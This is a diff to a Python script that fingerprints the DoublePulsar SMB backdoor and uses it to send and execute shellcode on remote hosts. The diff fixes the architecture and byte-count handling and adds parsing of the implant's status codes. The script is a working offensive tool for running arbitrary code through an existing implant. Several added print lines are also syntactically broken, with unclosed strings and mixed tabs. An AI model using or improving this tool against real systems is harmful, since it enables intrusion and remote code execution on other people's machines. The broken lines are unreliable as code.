@@ -225,8 +225,12 @@ if __name__ == "__main__":
         signature_long = struct.unpack('<I', signature)[0]
         key = calculate_doublepulsar_xor_key(signature_long)
         
-        arch_signature = final_response[18:26]
-        arch_signature_long = struct.unpack('<Q', arch_signature)[0]
+        #arch_signature = final_response[18:26]
+        #arch_signature_long = struct.unpack('<Q', arch_signature)[0]
+        #arch = calculate_doublepulsar_arch(arch_signature_long)
+        
+        arch_signature = final_response[22:26]
+        arch_signature_long = struct.unpack('<I', arch_signature)[0]
         arch = calculate_doublepulsar_arch(arch_signature_long)
         
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
@@ -324,7 +328,7 @@ if __name__ == "__main__":
         #<H = Little Endian unsigned short
         TotalDataCount = struct.pack('<H', shellcode_payload_size)
         DataCount = struct.pack('<H', shellcode_payload_size)
-        ByteCount = struct.pack('<H', shellcode_payload_size+13)
+        ByteCount = struct.pack('<H', shellcode_payload_size+12)
         
         '''
         not sure why we add 13 here
@@ -357,6 +361,18 @@ if __name__ == "__main__":
         s.send(doublepulsar_exec_packet)
         smb_response = s.recv(1024)
 
+        #0x52
+        if smb_response[34] == 82:
+	        print("Doublepulsar returned:  Success!\n)
+        #0x62
+        elif smb_response[34] == 98:
+	        print("Doublepulsar returned:  Invalid parameters!\n)
+        #0x72
+        elif smb_response[34] == 114:
+	        print("Doublepulsar returned:  Allocation failure!\n)
+        else:
+	        print("Doublepulsar didn't succeed\n")
+         
         tree_disconnect = binascii.unhexlify("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
         tree_disconnect_packet = bytearray(tree_disconnect)
         tree_disconnect_packet[28] = tree_id[0]
